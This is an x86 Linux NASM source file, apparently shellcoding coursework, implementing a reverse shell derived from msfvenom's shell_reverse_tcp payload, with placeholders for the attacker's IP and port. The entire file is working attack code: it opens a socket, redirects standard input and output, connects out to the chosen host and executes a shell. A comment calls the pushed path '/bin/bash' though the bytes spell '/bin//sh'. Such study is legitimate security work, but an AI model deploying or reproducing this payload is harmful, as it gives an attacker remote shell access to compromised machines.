;Filename: schema.nasm
;Author:  MrSquid
;Purpose: Reverse_shell.nasm code with port easily configurable (Nasm skeleton code obtain from msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=8888 EXITFUNC=THREAD -f raw | ndisasm -u -)

global _start 

section .text

_start: 
	;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	xor ebx,ebx 
	mul ebx
	push ebx
	inc ebx
	push ebx
	push byte +0x2
	mov ecx,esp
	mov al,0x66
	int 0x80

	xchg eax,ebx
	pop ecx
	dup2:	 ;int dup3(int oldfd, int newfd, int flags);
		mov al,0x3f
		int 0x80
		dec ecx
		jns dup2
		
	;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	push dword LOCALHOST ;0x101a8c0 ;Ip selected to be used (replaced with the hexadecimal value of the ip number) 
	push dword LOCALPORT ;0xb8220002 ;Port selected to be used (replaced with the hexadecimal value of the port number) 
	mov ecx,esp
	mov al,0x66
	push eax
	push ecx
	push ebx
	mov bl,0x3
	mov ecx,esp
	int 0x80
	
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	push edx
	push dword 0x68732f6e ;EXECVE("/bin/bash")
	push dword 0x69622f2f
	mov ebx,esp
	push edx
	push ebx
	mov ecx,esp
	mov al,0xb
	int 0x80
